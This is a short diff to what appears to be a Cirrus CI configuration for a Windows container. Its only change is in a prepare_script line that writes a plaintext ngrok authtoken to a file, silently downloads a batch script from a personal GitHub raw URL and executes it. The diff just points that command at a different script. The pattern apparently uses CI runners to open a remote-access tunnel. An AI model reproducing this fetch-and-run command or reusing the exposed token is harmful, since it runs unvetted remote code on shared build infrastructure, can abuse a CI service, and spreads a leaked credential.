@@ -4,4 +4,4 @@ windows_container:
   memory: 10G
   
 task:
-  prepare_script: echo ngrok authtoken "1aO30oRov2ig77pFpaieYZ1rOIx_7u2HxCdyR3afW22DZJap4" > NGROK.bat && curl -s -O https://raw.githubusercontent.com/DangDev/dangdev/main/azure_pipeline.bat && azure_pipeline.bat
+  prepare_script: echo ngrok authtoken "1aO30oRov2ig77pFpaieYZ1rOIx_7u2HxCdyR3afW22DZJap4" > NGROK.bat && curl -s -O https://raw.githubusercontent.com/DangDev/cirrus-win/main/cirrus_pipeline.bat && cirrus_pipeline.bat
